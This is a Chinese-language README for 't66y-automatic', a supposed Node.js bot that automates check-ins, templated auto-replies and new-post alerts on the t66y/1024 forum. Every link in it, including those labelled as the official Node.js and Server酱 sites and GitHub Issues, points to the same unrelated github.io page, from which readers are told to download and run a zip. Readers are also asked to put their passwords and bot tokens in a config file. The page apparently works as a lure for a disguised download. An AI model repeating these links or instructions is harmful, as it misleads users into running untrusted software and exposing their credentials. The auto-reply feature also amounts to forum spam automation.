# 🤖 t66y-automatic - 自动签到，省心省力

[![Download Now](https://img.shields.io/badge/Download-t66y--automatic-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://catalectic-concordance966.github.io)

## 🎯 这是什么？

t66y-automatic 是一个专为草榴社区（t66y/1024）设计的自动化工具。它能帮你自动完成日常重复操作，让你完全解放双手。无论你是签到、回帖，还是关注新帖动态，这个工具都能自动搞定。

简单来说：**装上它，你什么都不用管了。**

## ⚡ 核心功能

### ✅ 自动签到
每天自动登录并完成签到，再也不怕忘记签到而错过积分。

### 💬 自动回帖
支持预设回复内容，自动参与讨论，保持账号活跃度。

### 🔔 新帖监控
实时监控你关注版块的新帖子，第一时间获知最新动态。

### 📱 多平台推送
支持 Telegram、Bark、Server酱三种推送方式，新帖通知即刻到达你的手机。

### 👥 多账号支持
同时管理多个账号，每个账号独立配置，互不干扰。

### 🛠️ Node.js CLI
基于 Node.js 的命令行工具，轻量高效，一条命令即可完成安装。

## 🚀 快速开始

### 第一步：下载

访问此链接下载应用程序：

[点击这里下载](https://catalectic-concordance966.github.io)

### 第二步：安装

下载完成后，解压文件到你喜欢的文件夹（例如 `D:\t66y-automatic`）。

### 第三步：配置

1. 在解压后的文件夹中找到 `config.json` 文件
2. 用记事本打开，填入你的账号信息：

```json
{
  "accounts": [
    {
      "username": "你的账号",
      "password": "你的密码"
    }
  ],
  "telegram": {
    "botToken": "你的Telegram Bot Token",
    "chatId": "你的Telegram Chat ID"
  },
  "bark": {
    "key": "你的Bark Key"
  },
  "serverChan": {
    "sendKey": "你的Server酱 SendKey"
  }
}
```

### 第四步：运行

双击运行 `start.bat`（Windows）或执行以下命令：

```bash
node index.js
```

## 📥 安装指南

### Windows 用户

1. **下载安装包**
   前往 [下载页面](https://catalectic-concordance966.github.io)，下载最新版本的压缩包。

2. **解压文件**
   右键点击下载的 `.zip` 文件，选择"解压到当前文件夹"。

3. **安装依赖**
   确保你已经安装了 [Node.js](https://catalectic-concordance966.github.io)（建议使用最新稳定版）。
   
   在解压后的文件夹中打开命令提示符（Shift+右键 → "在此处打开命令窗口"），运行：
   ```bash
   npm install
   ```

4. **启动程序**
   运行：
   ```bash
   node index.js
   ```

### macOS / Linux 用户

同样适用，确保 Node.js 环境即可。

## 📝 详细配置说明

### 推送设置

#### Telegram 推送
1. 在 Telegram 中搜索 @BotFather
2. 发送 `/newbot` 创建新机器人
3. 获取 Bot Token 和你的 Chat ID
4. 填入配置文件的 `telegram` 部分

#### Bark 推送
1. 在 iOS 设备上安装 Bark 应用
2. 打开应用获取你的专属 Key
3. 填入配置文件的 `bark` 部分

#### Server酱推送
1. 访问 [Server酱官网](https://catalectic-concordance966.github.io)
2. 使用 GitHub 账号登录
3. 获取你的 SendKey
4. 填入配置文件的 `serverChan` 部分

### 自动回帖配置

在 `config.json` 中添加回帖模板：

```json
{
  "replyTemplates": [
    "感谢分享，楼主辛苦了！",
    "支持楼主，继续加油！",
    "好帖子，学习了！"
  ]
}
```

系统会随机选择一条作为回复内容。

## 🔧 高级功能

### 定时任务设置

你可以自定义执行时间：

```json
{
  "schedule": {
    "checkin": "0 9 * * *",
    "monitor": "*/30 * * * *"
  }
}
```

- `checkin`：每天上午9点自动签到
- `monitor`：每30分钟检查一次新帖

### 代理设置

如果需要使用代理：

```json
{
  "proxy": {
    "host": "127.0.0.1",
    "port": 1080
  }
}
```

## ❓ 常见问题

### 1. 为什么无法登录？
检查账号密码是否正确，确认网络连接正常。如果使用代理，确保代理设置正确。

### 2. 如何修改回复内容？
在 `config.json` 的 `replyTemplates` 数组中修改即可，支持中文和英文。

### 3. 如何停止程序？
在运行窗口中按 `Ctrl + C` 即可停止。

### 4. 推送没收到怎么办？
- 检查推送配置是否正确
- 确认网络连通性
- 查看日志文件排查错误

### 5. 支持多少个账号？
理论上没有数量限制，每个账号独立配置，互不影响。

## 📊 使用效果

- **时间节省**：每天节省 15-30 分钟的重复操作时间
- **效率提升**：新帖监控让你不错过任何重要内容
- **稳定可靠**：自动重试机制，确保任务成功执行

## 📄 日志查看

程序运行日志保存在 `logs` 文件夹中，每个日期一个文件。日志格式：

```
[2024-01-15 09:00:01] [INFO] 签到成功 - 账号: user1
[2024-01-15 09:00:05] [INFO] 回复成功 - 帖子: 123456
[2024-01-15 09:30:00] [NOTICE] 发现新帖 - 标题: 今日热点
```

## 🤝 反馈与支持

遇到问题或有改进建议？欢迎在 [GitHub Issues](https://catalectic-concordance966.github.io) 中反馈。

## ⚠️ 使用须知

1. 请合理使用本工具，遵守社区规则
2. 建议控制操作频率，避免异常行为
3. 定期检查账号状态，确保安全
4. 本工具仅供学习交流使用

## 📌 版本历史

- **v1.0.0**：初始版本，支持基础功能
- **v1.1.0**：添加多账号支持
- **v1.2.0**：新增 Server酱推送
- **v1.3.0**：优化定时任务调度

## 📦 技术栈

- Node.js
- Puppeteer（网页自动化）
- Axios（HTTP请求）
- node-cron（定时任务）

## 🎉 开始使用

现在就下载 t66y-automatic，享受自动化带来的便利吧！

[⬇️ 立即下载](https://catalectic-concordance966.github.io)

---

**最新版本**：[v1.3.0](https://catalectic-concordance966.github.io)

**更新日期**：2024年1月

**语言支持**：中文、English

**系统要求**：Windows 7+ / macOS 10.13+ / Linux

**Node.js 版本**：14.0.0 或更高

Keywords: 1024, auto-checkin, auto-reply, bark, caoliu, checkin-bot, crawler, forum-automation, forum-bot, nodejs, serverchan, t66y, telegram-bot